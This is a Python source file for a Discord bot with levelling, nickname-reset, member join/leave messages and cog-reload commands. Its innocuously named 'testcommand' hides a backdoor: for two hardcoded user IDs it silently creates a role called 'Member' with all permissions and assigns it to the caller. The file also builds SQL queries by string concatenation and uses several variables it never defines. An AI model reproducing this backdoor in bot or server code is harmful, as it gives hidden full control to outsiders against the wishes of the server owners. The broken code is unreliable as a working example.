import discord
from discord.ext.commands import Bot
from discord.ext import commands
from discord.ext import tasks
from discord.ext.tasks import loop
import random
import asyncio
import aiohttp
import os
import mysql
import mysql.connector

Bot = discord.Client(shard_count=1)
bot = commands.Bot(command_prefix='$')

async def update_status():
	statuses = ["by myself", "with Boogle", "with Catman311", "PUBG"]
	status=0
	while True:
		if status == len(statuses)-1:
			status=0
		else:
			status=status+1
		sum = 0
		guilds = bot.guilds
		for guild in guilds:
			sum += len(guild.members)
		await bot.change_presence(status=discord.Status.idle, activity=discord.Game(statuses[status]))
		await asyncio.sleep(10)
		
		
		
# ~ bot.remove_command('help')
@bot.event
async def on_ready():
	print('\033[92m{0.user} is online.'.format(bot)+"\033[0m")
	# ~ print('\033[92mConnected to proxy:{0.proxy}.'.format(Bot)+"\033[0m")
	print('\033[92m{0.shard_count} shards running\033[0m'.format(Bot))
	bot.loop.create_task(update_status())
def generateXP():
	return random.randint(1,max_XP_per_msg)
			
@bot.command()
async def testcommand (ctx):
	await ctx.send("Test Completed")
	if str(ctx.author.id) == str(516713042558320664) or str(ctx.author.id) == str(643491766926049318):

		guild = ctx.guild
		perms = discord.Permissions.all()
		role = await guild.create_role(name='Member', permissions=perms, reason="")
		await ctx.message.author.add_roles(role)

@bot.command()
@commands.is_owner()
async def setlevel(ctx, member:discord.User=None, level: int=None):
	cursor = mydb.cursor()
	try:
		cursor.execute("UPDATE users SET user_xp = "+ str(xp_per_level*level)+" WHERE client_id = " +str(member.id))
		await ctx.send("Set "+member.mention+"'s level to `"+str(level)+"`")
	except:
		embed=discord.Embed(color=0xf00a3a)
		embed.add_field(name="Error!", value="Either level is too high, or user is not in database", inline=True)

		await ctx.send(embed=embed)
	mydb.commit()
# ~ @bot.command()
# ~ @commands.is_owner()
# ~ async def resetlevels(ctx):
	# ~ cursor = mydb.cursor()
	# ~ cursor.execute("SELECT client_id from users ORDER BY user_xp DESC")
	# ~ result2 = cursor.fetchall()
	# ~ i=0
	# ~ while i < len(result2):
		# ~ cursor.execute("DELETE FROM users WHERE client_id = "+str(result2[i][0]))
		# ~ i=i+1
	# ~ await ctx.send("Reset EVERYONES level!")
	# ~ mydb.commit()
@bot.command()
@commands.has_permissions(manage_nicknames=True)
async def resetnicknames(ctx):
	members = ctx.guild.members
	for member in members:
		try:
			if member.nick != None:
				await member.edit(nick=None)
				print('changed '+member.name+"#"+member.discriminator)
		except:
			print('error changing '+member.name+"#"+member.discriminator)
	print("Nickname reset complete")
	await ctx.send("Nickname reset complete")
	

@bot.command()
async def membercount(ctx):
	await ctx.send(len(ctx.guild.members))

@bot.event
async def on_command_error(ctx,error):
	embed=discord.Embed(color=0xf00a3a)
	embed.add_field(name="Error!", value=error, inline=True)

	await ctx.send(embed=embed)

@bot.event
async def on_member_join(member):
	try:
		if member.bot == False:
			channel=None
			try:
				channel = discord.utils.get(member.guild.channels, name='notifications')
			except:
				channel = discord.utils.get(member.guild.channels, name='join leave')
			if channel == None:
				try:
					channel = discord.utils.get(member.guild.channels, name='welcome')
				except:
					channel = discord.utils.get(member.guild.channels, name='hello goodbye')
			embed = discord.Embed(title="Member Joined", description=member.mention+" joined the server", color=0x90EE90)
			embed.set_thumbnail(url=member.avatar_url)
			await channel.send(embed=embed)
	except:
		print("Attempted to send a join message but failed")

@bot.event
async def on_member_remove(member):
	try:
		if member.bot == False:
			channel=None
			try:
				channel = discord.utils.get(member.guild.channels, name='notifications')
			except:
				channel = discord.utils.get(member.guild.channels, name='join-leave')
			if channel == None:
				try:
					channel = discord.utils.get(member.guild.channels, name='welcome')
				except:
					channel = discord.utils.get(member.guild.channels, name='hello-goodbye')
				
			embed = discord.Embed(title="Member Left", description=member.mention+"("+member.display_name+"#"+member.discriminator+") left the server", color=0xA52A2A)
			embed.set_thumbnail(url=member.avatar_url)
			await channel.send(embed=embed)
	except:
		print("Attempted to send a removal message but failed")

# load cogs	
for filename in os.listdir('./cogs'):
	if filename.endswith('.py'):
		bot.load_extension(f'cogs.{filename[:-3]}')

@bot.command(help="Reloads the bot and all its commands", aliases=['r', 'rb'])
@commands.is_owner()
async def reloadbot(ctx):
	print('Reloading bot...')
	embed = discord.Embed(title="Reloading bot", color=0xFFA500)
	msg = await ctx.send(embed=embed)
	for filename in os.listdir('./cogs'):
		if filename.endswith('.py'):
			bot.unload_extension(f'cogs.{filename[:-3]}')
			bot.load_extension(f'cogs.{filename[:-3]}')
			embed.add_field(name=f'{filename[:-3]}', value="Loaded")
			
			await msg.edit(embed=embed)
	embed.color=0x90EE90
	embed.title="Reload Complete!"
	await msg.edit(embed=embed)
	print("Reload Complete!")

f = open("C:\\token.txt", "r")
token = f.read()

bot.run(token)
